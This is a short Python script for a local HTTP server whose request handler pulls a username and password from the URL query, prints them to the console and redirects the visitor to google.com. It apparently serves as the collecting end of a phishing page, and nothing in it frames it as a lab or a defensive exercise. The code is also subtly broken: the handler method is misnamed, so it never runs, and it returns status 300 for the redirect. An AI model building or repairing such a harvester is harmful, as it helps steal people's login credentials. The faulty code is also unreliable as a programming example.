from http.server import BaseHTTPRequestHandler,HTTPServer
from urllib.parse import urlparse,parse_qs

hostname="localhost"
port=8888

class MyServer(BaseHTTPRequestHandler):
    def do_get(self):
        queries=parse_qs(urlparse(self.path).query)
        print("Username: %s , Password: %s "%(queries["user"][0],queries["password"][0]))
        self.send_response(300)
        self.send_header("Location","http://google.com")
        self.end_headers()

if __name__=='__main__':
    webserver=HTTPServer((hostname,port),MyServer)
    print("Server Started http://%s:%s" %(hostname,port))

    try:
        webserver.serve_forever()
    except KeyboardInterrupt:
        pass

    webserver.server_close()
    print("\nServer stopped!")